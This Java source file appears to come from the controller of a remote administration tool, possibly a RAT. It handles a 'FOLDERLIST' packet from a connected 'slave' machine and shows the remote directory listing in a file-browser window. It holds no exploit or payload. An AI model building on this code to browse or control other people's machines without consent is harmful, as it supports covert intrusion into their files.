package com.redpois0n.packets.incoming;

import java.io.DataInputStream;
import java.util.ArrayList;
import java.util.List;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameRemoteFiles;
import com.redpois0n.utils.IconUtils;


public class PacketFOLDERLIST extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteFiles fr = FrameRemoteFiles.instances.get(slave);
		List<Object[]> dirs = new ArrayList<Object[]>();
		List<Object[]> files = new ArrayList<Object[]>();

		int len = slave.readInt();
		
		for (int i = 0; i < len + 1; i++) {		
			String line = slave.readLine();

			if (line == null || line.equals("END")) {
				break;
			}
			
			boolean dir = slave.readBoolean();
			if (dir) {
				boolean hidden = slave.readBoolean();
				
				if (line != null) {
					dirs.add(new Object[] { line, "", "", hidden ? "Yes" : "" });
				}
			} else {		
				String date = slave.readLine();
				String size = (Long.parseLong(slave.readLine()) / 1024L) + " kB";	
				boolean hidden = slave.readBoolean();
				
				if (line != null) {
					files.add(new Object[] { line, size, date, hidden ? "Yes" : "" });
				}
			}
		}
		
		if (fr != null) {
			while (fr.model.getRowCount() > 0) {
				fr.model.removeRow(0);
			}
			
			for (Object[] string : dirs) {
				fr.renderer.icons.put(string[0].toString(), IconUtils.getFileIconFromExtension(string[0].toString(), true));
				fr.model.addRow(new Object[] { string[0], string[1], "", string[3] });
			}
			
			for (Object[] string : files) {
				fr.renderer.icons.put(string[0].toString(), IconUtils.getFileIconFromExtension(string[0].toString(), false));
				fr.model.addRow(new Object[] { string[0], string[1], string[2], string[3] });
			}
		}

	}

}
